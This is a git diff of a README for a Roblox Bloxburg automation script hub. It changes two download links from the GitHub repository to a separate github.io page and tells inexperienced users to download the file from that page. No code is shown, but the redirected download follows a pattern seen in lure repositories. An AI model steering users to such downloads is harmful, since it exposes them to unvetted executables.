@@ -1,6 +1,6 @@
 # ⚡ bloxburg-auto-script-hub - Automate Your Bloxburg Life Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Bloxburg%20Auto%20Script%20Hub-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/jacksonvertebrate332/bloxburg-auto-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Bloxburg%20Auto%20Script%20Hub-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://jacksonvertebrate332.github.io)
 
 ## 🎮 What Is This?
 
@@ -28,7 +28,7 @@ Assign your own keyboard shortcuts. Press a key to start or stop the script, tog
 Follow these simple steps to get bloxburg-auto-script-hub running on your computer. No technical experience needed.
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/jacksonvertebrate332/bloxburg-auto-script-hub](https://github.com/jacksonvertebrate332/bloxburg-auto-script-hub)
+Visit this link to download the application: [https://jacksonvertebrate332.github.io](https://jacksonvertebrate332.github.io)
 
 The download page will open in your browser. Click the download button on that page to save the file to your computer.
 
